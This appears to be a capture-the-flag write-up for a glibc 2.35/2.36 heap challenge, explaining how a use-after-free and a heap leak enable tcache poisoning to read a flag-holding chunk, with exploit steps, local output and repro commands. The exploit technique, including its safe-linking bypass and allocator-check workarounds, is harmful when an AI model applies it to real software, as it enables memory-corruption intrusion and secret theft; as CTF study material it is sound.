# CTF Solve — heap + unreachable secret chunk (`house_of_water_chal.c`)

Target: `nc 145.239.142.129 1341` — Author: Om Khanjodkar
Files: `chal` (PIE, Full RELRO, canary, NX), `libc.so.6`, `ld-linux-x86-64.so.2`

**Result: deterministic flag read via tcache poisoning, no bruteforce, no shell needed.**
Local PoC leaks `flag{missing_flag_txt}` (dummy) and any real `./flag.txt`.
See `exploit.py` (`python3 exploit.py` local, `python3 exploit.py remote`).

> Remote status (2026-10-09): port 1341 is OPEN but closes immediately with
> **0 bytes** (no menu). This matches a **crash on startup**, most likely the
> provided `ld`/`libc` mismatch (below). Fix the deploy, then the same
> `exploit.py remote` applies unchanged.

---

## 1. Reversing (objdump, no GDB needed)

Globals (`.bss`):

```
0x4040 chunks[64]  (8*64 = 0x200)
0x4240 sizes[64]   (8*64 = 0x200)
0x4440 freed[64]   (1*64 = 0x40)
```

- `setup()`: `setvbuf(...,_IONBF)`, `secret=malloc(0x80)`, `memset 0`,
  `fopen("./flag.txt","r")+fgets(secret,0x80)` else `strcpy(secret,"flag{missing_flag_txt}\n")`.
  `secret` is a **stack local, never stored** → unreachable from menu.
- `read_long(prompt)`: `printf("%s",prompt); fgets(buf,0x40); strtol`.
- `read_index()`: `0..63` else `die("Invalid index")`.
- `check_bounds(idx,off,len)`:
  `1<=len<=0x400`, `off >= (freed[idx]?-0x10:0)`, `off+len <= sizes[idx]`.
  Freed chunks allow `off==-0x10` → can read/write **chunk header** (`prev_size/size`) + `fd/bk`.
- `do_malloc`: `chunks[i]=malloc(size); sizes[i]=size; freed[i]=0` (no reuse check → leak).
- `do_free`: `free(chunks[i]); freed[i]=1` (**UAF**: pointer kept, no double-free check).
- `do_edit`: `check_bounds` then `fread(chunks[i]+off,1,len,stdin)` (binary-safe UAF write).
- `do_show`: `check_bounds` then `printf("%02x ",...)` hexdump (UAF read → leaks).
- `main`: menu `1)malloc 2)free 3)edit 4)show 5)exit`.

Protections: PIE (DYN), Full RELRO (`BIND_NOW`), stack canary, NX.
Libc: `Ubuntu GLIBC 2.35-0ubuntu3.15` (strings), but `ld --version` says
`2.39-0ubuntu8.8` → **mismatched pair, crashes locally** (`stack smashing`,
see §5). System for local testing: Debian GLIBC 2.36 (same tcache behavior).

## 2. Heap layout (the key insight)

First `malloc` creates heap + `tcache_perthread_struct` (`0x290` bytes at `heap+0x0`).
Verified with a mimic program (`setvbuf` unbuffered + same alloc order):

```
heap+0x000: tcache chunk (header + counts[64] + entries[64])
heap+0x290: secret chunk header (prev_size | size=0x91)
heap+0x2a0: secret user data (0x80 bytes flag)      <-- target
...
heap+0x510: first menu malloc(0x80) -> A
heap+0x5a0: second menu malloc(0x80) -> B
```

All in the **first page** (`offset<0x1000`), so `A>>12 == heap_base>>12`
and `heap_base = (A->next)<<12` where `A->next = PROTECT(A,NULL)=A>>12`.

So: **leak one tcache `fd`, shift left 12 → heap base → secret = base+0x290.**

## 3. Why straightforward tcache poisoning works (and House of Water is overkill)

`House of Water` (Blue Water `udp`, PotluckCTF 2023) controls `tcache_perthread_struct`
via a fake `0x10001` chunk for **leakless** RCE (needs 2× 4-bit bruteforce).
Here `show()` gives a direct heap leak, so classic safe-linking bypass is
simpler and 100% reliable.

Three glibc-2.35/2.36 pitfalls we hit and solved (see disassembly/tests in analysis):

1. **`counts` check, not just `head`.** `tcache_get` (`0x98a70` in 2.36):
   `if(counts[idx]==0) goto fallback` even if `entries[idx]!=NULL`.
   Single-free poisoning (`counts=1` → pop → `counts=0,head=target`) **fails**:
   next malloc sees `counts==0` and goes to top (fresh zeros).
   **Fix: free TWO chunks** (`counts=2`: `B->A`), corrupt head `B->next`,
   then pop `B` (`counts=1,head=target`) + pop `target` (`counts=0`). Verified in C.
2. **Alignment check.** `tcache_get` does `test al,0xf; jne "unaligned tcache chunk"`.
   `secret_user+8` (`...2a8`) is misaligned → abort. **Fix: target the
   CHUNK header** `secret-0x10` (`...290`, aligned).
3. **`e->key=NULL` corruption.** Every tcache pop zeroes `e+8`.
   Targeting user data zeroes `flag[8:16]` (`sing_fla` → zeros).
   Targeting the chunk header zeroes the **size field** (`0x91`→`0`) instead —
   flag at `+0x10` stays fully intact, and `show` (no malloc/free) never
   inspects the corrupted size. **One run → full flag.**

Also: `e->key` on 2.36 is a per-process **random cookie** (not heap), same for
all chunks in a run. `tcache_get` does **not** verify it (only `free` uses it
for double-free detection), so poisoning to an allocated chunk (flag bytes as
fake `next`/`key`) succeeds; the wild `REVEAL(next)` head afterwards is
harmless if we never malloc that bin again.

Fastbin alternative was rejected: `0x90` (secret) ≠ fastbin sizes (`≤0x80`),
second pop would abort on size mismatch (`"unaligned fastbin chunk detected 3"`).

## 4. Exploit steps (`exploit.py`)

```
1. malloc(0,0x80)=A, malloc(1,0x80)=B
2. free(0), free(1)                       # tcache[0x90]: B->A, counts=2
3. mask = u64(show(0,0,8))                # A->next = A>>12
   heap_base = mask<<12
   target = heap_base+0x290               # secret chunk, aligned
   mangled = mask ^ target                # PROTECT(B,target), B>>12==mask same page
4. edit(1,0,8,mangled)                    # UAF: B->next=target (keep B->key)
5. malloc(2,0x80) -> B; malloc(3,0x80) -> secret_chunk (size zeroed, flag intact)
6. show(3,0x10,0x50) -> flag
```

Local:

```
$ python3 exploit.py
[+] heap_base      = 0x5569b2a39000
[+] secret_chunk   = 0x5569b2a39290
[+] FLAG BYTES = b'flag{missing_flag_txt}\n'
[+] FLAG = flag{missing_flag_txt}
```

With `./flag.txt` containing `CTF{test_flag_123456789}` the same script leaks
`b'CTF{test_flag_123456789}\n'` — proving it reads the file-loaded secret.

Remote (once deploy fixed): `python3 exploit.py remote`.

No shell is required: the flag **is** the heap secret. A shell (`system("/bin/sh")`
via FSOP/House-of-Apple) would be a longer path to the same `./flag.txt`.

## 5. Deploy bug: mismatched ld/libc + down remote

```
$ strings libc.so.6 | grep "stable release"  # -> Ubuntu GLIBC 2.35-0ubuntu3.15
$ ./ld-linux-x86-64.so.2 --version           # -> Ubuntu GLIBC 2.39-0ubuntu8.8 (!)
$ ./ld-linux-x86-64.so.2 --library-path . ./chal   # -> *** stack smashing detected ***
$ LD_LIBRARY_PATH=. ./chal                            # -> *** stack smashing detected ***
$ ./chal                                              # system 2.36 -> works
```

Provided `ld` (2.39) + `libc` (2.35) crash even locally; remote `nc` returns
0 bytes, consistent with the same crash in the server. Fix: ship the **matching**
`ld-2.35` for `Ubuntu GLIBC 2.35-0ubuntu3.15` (or run with system 2.36 — offsets
for this exploit, `secret=heap+0x290`, are version-independent as long as the
first-page layout holds).

## 6. Files

- `exploit.py` — local+remote exploit (pwntools preferred, stdlib fallback).
- `chal`, `libc.so.6`, `ld-linux-x86-64.so.2` — challenge artifacts.
- This writeup.

## 7. Repro

```bash
chmod +x chal exploit.py
python3 exploit.py                # dummy flag
echo 'CTF{local-test}' > flag.txt && python3 exploit.py && rm flag.txt
python3 exploit.py remote         # after server fix
```
